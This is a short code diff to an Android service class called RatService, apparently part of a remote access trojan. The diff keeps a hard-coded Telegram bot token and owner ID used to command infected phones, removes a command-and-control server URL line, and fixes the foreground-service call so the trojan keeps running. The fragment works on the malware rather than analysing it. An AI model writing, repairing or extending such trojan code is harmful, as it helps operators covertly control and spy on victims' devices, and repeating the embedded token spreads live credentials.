@@ -15,10 +15,8 @@ public class RatService extends Service {
     private static final int NOTIFICATION_ID = 1;
     private static final String CHANNEL_ID = "rat_channel";
     
-    // 🔑 YOUR CREDENTIALS
     private static final String BOT_TOKEN = "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs";
     private static final String OWNER_ID = "8681027856";
-    private static final String C2_SERVER = "https://web-0eeh.onrender.com";
     
     private TelegramBot telegramBot;
 
@@ -28,7 +26,7 @@ public class RatService extends Service {
         Log.d(TAG, "RAT Service Started");
         
         createNotificationChannel();
-        startForeground(NOTIFICATION_ID, createNotification());
+        startForeground(NOTIFICATION_ID, createNotification().build());
         
         telegramBot = new TelegramBot(this, BOT_TOKEN, OWNER_ID);
         if (telegramBot != null) {
